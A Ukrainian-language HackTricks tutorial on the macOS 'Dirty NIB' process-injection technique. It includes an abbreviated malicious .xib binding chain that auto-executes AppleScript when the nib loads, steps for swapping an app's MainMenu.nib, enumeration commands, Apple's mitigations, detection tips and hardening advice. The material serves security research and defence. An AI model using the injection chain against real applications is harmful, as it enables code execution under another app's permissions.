# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB означає зловживання файлами Interface Builder (`.xib`/`.nib`) усередині підписаного bundle macOS app для виконання контрольованої attacker-ом логіки в цільовому процесі, унаслідок чого він успадковує його entitlements і TCC permissions. Цю техніку спочатку задокументував xpn (MDSec), а згодом її узагальнив і суттєво розширив Sector7, який також описав mitigation від Apple у macOS 13 Ventura та macOS 14 Sonoma.<sup>[[1]](#references)[[2]](#references)</sup> Передумови та детальний аналіз див. у references наприкінці.

> TL;DR
> • До macOS 13 Ventura: заміна MainMenu.nib bundle (або іншого nib, що завантажується під час запуску) могла надійно забезпечити process injection і часто privilege escalation.
> • Починаючи з macOS 13 (Ventura) та з покращеннями в macOS 14 (Sonoma): перевірка під час першого запуску, захист bundle, Launch Constraints і новий дозвіл TCC “App Management” значною мірою перешкоджають tampering із nib після запуску з боку unrelated apps. Атаки все ще можуть бути можливими в нішевих випадках (наприклад, same-developer tooling, що змінює власні apps, або terminals, яким користувач надав App Management/Full Disk Access).


## Що таке NIB/XIB files

Файли Nib (скорочення від NeXT Interface Builder) — це серіалізовані UI object graphs, які використовують AppKit apps. Сучасний Xcode зберігає редаговані XML `.xib` files, що під час build компілюються в `.nib`. Типовий app завантажує свій main UI через `NSApplicationMain()`, який читає ключ `NSMainNibFile` з `Info.plist` app і під час runtime створює екземпляри object graph.

Ключові моменти, що роблять атаку можливою:
- NIB loading створює екземпляри довільних Objective-C classes без вимоги відповідати NSSecureCoding (nib loader від Apple переходить до `init`/`initWithFrame:`, якщо `initWithCoder:` недоступний).
- Cocoa Bindings можна зловживати для виклику methods під час створення екземплярів nib, зокрема ланцюжків викликів, які не потребують взаємодії з користувачем.


## Процес Dirty NIB injection (погляд attacker-а)

Класичний flow до Ventura:
1) Створіть malicious `.xib`
- Додайте об’єкт `NSAppleScript` (або інші “gadget” classes, такі як `NSTask`).
- Додайте `NSTextField`, title якого містить payload (наприклад, AppleScript або command arguments).
- Додайте один або кілька об’єктів `NSMenuItem`, підключених через bindings для виклику methods у target object.

2) Auto-trigger без кліків користувача
- Використайте bindings, щоб встановити target/selector menu item, а потім викликати private method `_corePerformAction`, завдяки чому action автоматично виконається під час завантаження nib. Це усуває потребу в тому, щоб користувач натискав кнопку.

Мінімальний приклад auto-trigger chain усередині `.xib` (скорочено для ясності):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Це забезпечує довільне виконання AppleScript у цільовому процесі під час завантаження nib.<sup>[[1]](#references)</sup> Розширені ланцюжки можуть:
- Створювати довільні класи AppKit (наприклад, `NSTask`) і викликати методи без аргументів, як-от `-launch`.
- Викликати довільні selectors з аргументами-об’єктами за допомогою наведеного вище binding trick.
- Завантажувати AppleScriptObjC.framework для взаємодії з Objective-C і навіть викликати вибрані C APIs.
- У старіших системах, де ще є Python.framework, взаємодіяти з Python, а потім використовувати `ctypes` для виклику довільних C functions (дослідження Sector7).<sup>[[2]](#references)</sup>

3) Замініть nib застосунку
- Скопіюйте target.app у доступне для запису розташування, замініть, наприклад, `Contents/Resources/MainMenu.nib` на шкідливий nib і запустіть target.app. До Ventura після одноразової перевірки Gatekeeper під час наступних запусків виконувалися лише поверхневі перевірки підпису, тому невиконувані ресурси (наприклад, .nib) повторно не перевірялися.

Приклад AppleScript payload для видимого тесту:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Сучасні захисти macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple запровадила кілька системних механізмів захисту, які суттєво зменшують життєздатність Dirty NIB у сучасних версіях macOS:<sup>[[2]](#references)</sup>
- Глибока перевірка під час першого запуску та захист bundle (macOS 13 Ventura)
- Під час першого запуску будь-якої програми (з quarantine або без нього) глибока перевірка підпису охоплює всі ресурси bundle. Після цього bundle стає захищеним: лише програми від того самого developer (або явно дозволені програмою) можуть змінювати його вміст. Іншим програмам потрібен новий дозвіл TCC “App Management”, щоб записувати дані до bundle іншої програми.
- Launch Constraints (macOS 13 Ventura)
- System/Apple-bundled apps не можна скопіювати в інше місце та запустити; це унеможливлює підхід “скопіювати до /tmp, змінити, запустити” для OS apps.
- Покращення в macOS 14 Sonoma
- Apple посилила App Management і виправила відомі обходи захисту (наприклад, CVE‑2023‑40450), про які згадувала Sector7. Python.framework було видалено раніше (macOS 12.3), що зламало деякі ланцюжки privilege escalation.
- Зміни Gatekeeper/Quarantine
- Ширше обговорення Gatekeeper, походження файлів і змін assessment, які вплинули на цю техніку, наведено на сторінці за посиланням нижче.

> Практичний наслідок
> • У Ventura+ зазвичай неможливо змінити .nib сторонньої програми, якщо ваш процес не має App Management або не підписаний тим самим Team ID, що й цільова програма (наприклад, developer tooling).
> • Надання App Management або Full Disk Access shell/terminal фактично знову відкриває цю attack surface для всього, що може виконувати code у контексті цього terminal.


### Робота з Launch Constraints

Launch Constraints блокують запуск багатьох Apple apps із нестандартних місць, починаючи з Ventura. Якщо ви покладалися на workflow до Ventura, наприклад копіювали Apple app до тимчасової директорії, змінювали `MainMenu.nib` і запускали її, очікуйте, що це не працюватиме в >= 13.0.


## Перелік цілей і nib (корисно для досліджень / legacy systems)

- Знайдіть apps, інтерфейс яких керується nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Знайдіть ресурси nib-кандидати всередині bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Ретельно перевіряйте підписи коду (перевірка не пройде, якщо ви змінили ресурси й не підписали їх повторно):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Примітка: У сучасних версіях macOS під час спроби запису до бандла іншого застосунку без належної авторизації вас також заблокує захист бандлів/TCC.


## Поради щодо виявлення та DFIR

- Моніторинг цілісності файлів ресурсів бандла
- Слідкуйте за змінами mtime/ctime для `Contents/Resources/*.nib` та інших невиконуваних ресурсів у встановлених застосунках.
- Unified logs і поведінка процесів
- Слідкуйте за неочікуваним виконанням AppleScript усередині GUI-застосунків і за процесами, що завантажують AppleScriptObjC або Python.framework. Приклад:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Проактивні перевірки
- Періодично запускайте `codesign --verify --deep` для критичних застосунків, щоб переконатися, що ресурси залишаються незмінними.
- Контекст привілеїв
- Перевіряйте, хто або що має дозвіл TCC “App Management” або Full Disk Access (особливо термінали й агенти керування). Вилучення цих дозволів із shell-інструментів загального призначення запобігає тривіальному повторному виконанню втручання на кшталт Dirty NIB.


## Посилення захисту (для розробників і захисників)

- Віддавайте перевагу програмному UI або обмежуйте те, що інстанціюється з nib-файлів. Не додавайте потужні класи (наприклад, `NSTask`) до графів nib і уникайте bindings, які опосередковано викликають selectors довільних об’єктів.
- Використовуйте hardened runtime з Library Validation (це вже стандарт для сучасних застосунків). Хоча сам по собі він не зупиняє nib injection, він блокує просте завантаження native code і змушує атакувальників використовувати payloads лише на основі scripting.
- Не запитуйте та не використовуйте широкі дозволи App Management в інструментах загального призначення. Якщо MDM потребує App Management, ізолюйте цей контекст від shell-інструментів, якими керує користувач.
- Регулярно перевіряйте цілісність бандла свого застосунку та зробіть механізми оновлення здатними самостійно відновлювати ресурси бандла.


## Додаткові матеріали в HackTricks

Дізнайтеся більше про Gatekeeper, quarantine і зміни provenance, що впливають на цю техніку:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Посилання

- [1] [xpn – DirtyNIB (оригінальний опис із прикладом для Pages)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
